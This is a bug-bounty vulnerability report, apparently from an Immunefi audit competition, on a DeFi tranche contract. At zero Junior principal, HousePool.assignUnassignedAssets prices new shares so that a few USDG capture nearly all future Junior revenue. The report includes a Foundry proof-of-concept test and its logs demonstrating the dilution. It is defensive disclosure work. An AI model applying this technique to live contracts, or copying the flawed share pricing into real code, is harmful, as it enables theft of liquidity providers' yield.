# \#99836 [SC-Critical] assignUnassignedAssets mints Junior shares at zero principal, so the receiver takes the whole future recovery of a wiped Junior tranche

**Submitted on Nov 15th 2026 at 12:40:20 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99836
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro
After a loss wipes the Junior tranche, its principal is 0 but its shares are still outstanding and still own all future Junior revenue. Every ordinary entry path refuses this state, but the owner's `HousePool.assignUnassignedAssets` does not. It prices the new shares against zero principal, so even a few USDG of ownerless assets mint more than 99.9999% of all Junior shares to the receiver. The existing Junior holders are diluted to nothing and lose their whole claim on future revenue. In the PoC, assigning 853 USDG moves 1,000,506 USDG of later revenue from the old Junior holders to the receiver. While Junior's principal remains zero, this is also the only way the owner can clear the unassigned assets, so the normal recovery flow leads to it.

## Vulnerability Details
`assignUnassignedAssets` reconciles, takes the whole `unassignedAssets` balance and mints bootstrap shares for it:

```solidity
uint256 shares = ITrancheVaultBootstrap(targetVault).quoteBootstrapDeposit(amount);
...
} else {
    juniorPrincipal += amount;
}
unassignedAssets = 0;
ITrancheVaultBootstrap(targetVault).bootstrapMint(shares, receiver);
```

The quote in `TrancheVault` is:

```solidity
return Math.mulDiv(assets, accruedTotalSupply() + VIRTUAL_SHARES, totalAssets_ + 1, rounding);
```

where `totalAssets_` is the Junior principal. When the principal is 0, the divisor is only the virtual 1, so `amount` atoms mint `amount * (supply + 1000)` shares. The receiver gets `amount / (amount + 1)` of the tranche whatever its size: 1 atom gives 50%, 1 USDG gives 99.9999%.

The same state is refused everywhere else, because entering at zero NAV with nonzero supply takes over the tranche:

* `TrancheVault.requestDeposit` reverts with `TerminallyWiped`;
* `HousePool._canAcceptTrancheDeposits` returns false for `juniorPrincipal == 0 && juniorSupply != 0`;
* `_settleLpEpoch` defers deposit activation when `pricingAssets == 0 && pricingSupply != 0`.

ACCOUNTING_SPEC.md lists "zero tranche NAV with nonzero supply" as an entry blocker and says "a wiped tranche cannot be silently revived by an ordinary asynchronous deposit" and "seeded ownership continuity is preferred over governance re-assignment". Only the bootstrap path has no such check.

The wiped shares are not worthless. Once Senior is back at its high-water mark, all further revenue is credited to `juniorPrincipal`, which belongs to the outstanding Junior shares (it would go to `unassignedAssets` only if Junior supply were 0). So the old holders recover from future revenue, unless somebody is minted almost 100% of the shares first.

The owner does not need to do anything unusual to get here:

1. A loss wipes Junior and impairs Senior.
2. The owner calls `recapitalizePool` to restore Senior. Recapitalization never goes to Junior: it fills the Senior gap and any remainder becomes `unassignedAssets`. The gap moves with the Senior coupon and the mark until the next reconcile, so the owner cannot rely on matching it exactly.
3. `unassignedAssets > 0` blocks all new LP deposits, so it has to be cleared.
4. `assignUnassignedAssets(true, ...)` reverts with `ExceedsSeniorDepositCapacity`, because Senior capacity is 0 while Junior principal is 0.
5. The only way to clear the unassigned balance now is `assignUnassignedAssets(false, receiver)`, which prices the new shares at zero principal while Junior's principal is zero. Waiting until revenue has given Junior a positive principal would avoid this, but nothing makes the owner wait or warns against assigning.

The function's own NatSpec says it mints "matching shares" and "prevents later LPs from implicitly capturing previously ownerless value". Here the ownerless value is a few USDG, but the minted shares capture the existing holders' claim on all future Junior revenue.

## Impact Details
Existing Junior LPs lose their whole share of the tranche's recovery. All Junior revenue earned after the assignment goes to the receiver, and this continues for as long as the tranche earns. The size of the assigned amount does not matter: in the PoC 853 USDG of ownerless assets give the receiver 999,999 / 1,000,000 of the shares, and the next 1,000,000 USDG of revenue is worth 1,001,360 USDG to the receiver and 0 to the old holders. Without the assignment the same revenue is worth 1,000,506 USDG to the old holders. Senior is not affected.

Preconditions: a loss larger than the Junior tranche, and the owner's documented `recapitalizePool` + `assignUnassignedAssets` recovery. No malicious intent is needed, because the code leaves the owner no other way to clear the unassigned assets in this state.

## References
* `assignUnassignedAssets`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L704
* Bootstrap quote and share formula: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1392-L1396 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1853-L1859
* `bootstrapMint`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1549-L1555
* Ordinary deposit refuses a wiped tranche: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1585-L1587, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L494-L498 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L917-L920
* Recapitalization goes to the Senior gap, the rest to unassigned: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137
* Senior capacity is 0 with empty Junior: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol#L27-L43
* Spec: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L307-L308 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L324-L327

## Proof of Concept

The following PoC uses release risk parameters and the 80% Senior share limit (Senior 8,000,000, Junior 2,010,000). The loss and the revenue are produced by real trades through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, so every price passes the in-scope oracle and only the Pyth update is mocked. The prices stay between 0.20 and 1.90, inside the range the oracle accepts and below the 2.00 cap. It contains two tests with the same events: Both tests assert the results they log.

* `test1_assignToWipedJunior_receiverTakesAllFutureRevenue` -- after the Junior wipe and the recapitalization, the owner assigns the leftover 853 USDG to Junior. The receiver gets 99.9999% of the shares and all later revenue.
* `test2_withoutAssignment_oldHoldersKeepFutureRevenue` -- the same without the assignment call. The later revenue belongs to the old Junior holders.

Both tests also check that an ordinary Junior deposit reverts with `TerminallyWiped` and that assigning to Senior reverts.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console} from "forge-std/console.sol";

contract PoC_AssignToWipedJunior is BasePerpTest {

    address seniorLp = makeAddr("seniorLp");
    address juniorLp = makeAddr("juniorLp");
    address newLp = makeAddr("newLp");
    address receiver = makeAddr("receiver");
    address traderA = makeAddr("traderA");
    address traderC = makeAddr("traderC");
    address keeper = makeAddr("keeper");

    // Release parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // Senior 8,000,000 + Junior 2,010,000 (each includes the 1,000 USDG seed), Senior share limit 80%.
    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(juniorLp, 2_009_000e6);
        _fundSenior(seniorLp, 7_999_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours); // deposit cooldown
    }

    function test1_assignToWipedJunior_receiverTakesAllFutureRevenue() public {
        _scenario(true);
    }

    function test2_withoutAssignment_oldHoldersKeepFutureRevenue() public {
        _scenario(false);
    }

    function _scenario(
        bool assign
    ) internal {
        // 1. A trader's LONG of 3,125,000 units, opened at 1.00, is closed at 0.20 and wins 2,500,000 USDG:
        //    Junior (2,010,000) is wiped, Senior is impaired by ~490,000.
        _fundTrader(traderA, 100_000e6);
        _trade(traderA, 3_125_000e18, 50_000e6, false, 1e8);
        _trade(traderA, 3_125_000e18, 0, true, 0.2e8);

        // juniorLp queues a redemption, so the next settleLpEpoch() has an epoch to process.
        uint256 shares = juniorVault.balanceOf(juniorLp);
        vm.prank(juniorLp);
        uint256 requestId = juniorVault.requestRedeem(shares, juniorLp, juniorLp);

        // 2. The owner recapitalizes the Senior gap with a 1,000 USDG margin on top.
        (uint256 seniorNow,,,) = pool.getPendingTrancheState();
        uint256 recap = pool.seniorHighWaterMark() - seniorNow + 1000e6;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);

        // 3. A keeper settles the LP epoch: the loss is booked, Senior is restored, the leftover becomes unassigned.
        vm.warp(pool.lpEpochStart(requestId));
        vm.prank(keeper);
        pool.settleLpEpoch(0, 0);
        console.log(
            "Owner recapitalized %s. Senior %s, Junior %s",
            recap / 1e6,
            _usdg(pool.seniorPrincipal()),
            _usdg(pool.juniorPrincipal())
        );
        console.log("Unassigned assets:                 %s", _usdg(pool.unassignedAssets()));

        // An ordinary Junior deposit is refused in this state.
        settlementToken.mint(newLp, 1000e6);
        vm.startPrank(newLp);
        settlementToken.approve(address(juniorVault), 1000e6);
        vm.expectRevert(TrancheVault.TrancheVault__TerminallyWiped.selector);
        juniorVault.requestDeposit(1000e6, newLp, newLp);
        vm.stopPrank();

        // The unassigned assets cannot go to Senior because Junior is empty.
        vm.expectRevert(IHousePool.HousePool__ExceedsSeniorDepositCapacity.selector);
        pool.assignUnassignedAssets(true, receiver);

        // 4. The owner assigns the unassigned assets to Junior (test1 only).
        uint256 oldShares = juniorVault.totalSupply();
        if (assign) {
            pool.assignUnassignedAssets(false, receiver);
            console.log(
                "Receiver's part of Junior shares:  %s / 1000000",
                juniorVault.balanceOf(receiver) * 1e6 / juniorVault.totalSupply()
            );
        }

        // 5. The pool earns 1,000,000 USDG of revenue from a trader loss: with the price at 0.90, a trader opens
        //    a fully collateralized LONG of 1,000,000 units and closes it at 1.90. Senior is whole, so it goes
        //    to Junior.
        _fundTrader(traderC, 1_100_000e6);
        router.updateMarkPrice(_mockPythUpdateData(0.9e8));
        _trade(traderC, 1_000_000e18, 1_050_000e6, false, 0.9e8);
        _trade(traderC, 1_000_000e18, 0, true, 1.9e8);

        (uint256 senior, uint256 junior,,) = pool.getPendingTrancheState();
        console.log("After 1M of revenue: Senior %s, Junior %s", _usdg(senior), _usdg(junior));
        console.log("Value of old Junior shares:        %s", _usdg(juniorVault.convertToAssets(oldShares)));
        console.log(
            "Value of receiver's shares:        %s", _usdg(juniorVault.convertToAssets(juniorVault.balanceOf(receiver)))
        );
        if (assign) {
            assertGt(juniorVault.balanceOf(receiver) * 1e6 / juniorVault.totalSupply(), 999_000, "receiver owns Junior");
            assertLt(juniorVault.convertToAssets(oldShares), 1e6, "old Junior shares get none of the revenue");
            assertGt(juniorVault.convertToAssets(juniorVault.balanceOf(receiver)), 999_000e6, "receiver gets it");
        } else {
            assertGt(juniorVault.convertToAssets(oldShares), 999_000e6, "old Junior shares keep the revenue");
        }
    }

    /// The account commits a LONG order through `OrderRouter.commitOrder` and the keeper executes it through
    /// `OrderRouter.executeOrder` at `price`. Only the Pyth update is mocked.
    function _trade(
        address account,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

    function _usdg(
        uint256 assets
    ) internal pure returns (uint256) {
        return assets / 1e6;
    }

}
```

Save this code to the file `packages/perps/test/perps/poc/PoC_AssignToWipedJunior.t.sol` and run `forge test --root packages/perps --mc PoC_AssignToWipedJunior -vv`. It will print the following logs (all values are in whole USDG):

```
Ran 2 tests for test/perps/poc/PoC_AssignToWipedJunior.t.sol:PoC_AssignToWipedJunior
[PASS] test1_assignToWipedJunior_receiverTakesAllFutureRevenue() (gas: 8915365)
Logs:
  Owner recapitalized 486122. Senior 8000146, Junior 0
  Unassigned assets:                 853
  Receiver's part of Junior shares:  999999 / 1000000
  After 1M of revenue: Senior 8000146, Junior 1001360
  Value of old Junior shares:        0
  Value of receiver's shares:        1001360

[PASS] test2_withoutAssignment_oldHoldersKeepFutureRevenue() (gas: 8736312)
Logs:
  Owner recapitalized 486122. Senior 8000146, Junior 0
  Unassigned assets:                 853
  After 1M of revenue: Senior 8000146, Junior 1000506
  Value of old Junior shares:        1000506
  Value of receiver's shares:        0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 94.75ms (121.96ms CPU time)
```

The owner added a 1,000 USDG margin on top of the Senior gap, and 853 USDG of it ended up unassigned. In `test1` these 853 USDG buy 999,999 / 1,000,000 of the Junior shares, so the next 1M of revenue belongs to the receiver and the old Junior shares are worth 0. In `test2` the same revenue is worth 1,000,506 USDG to the old Junior holders.
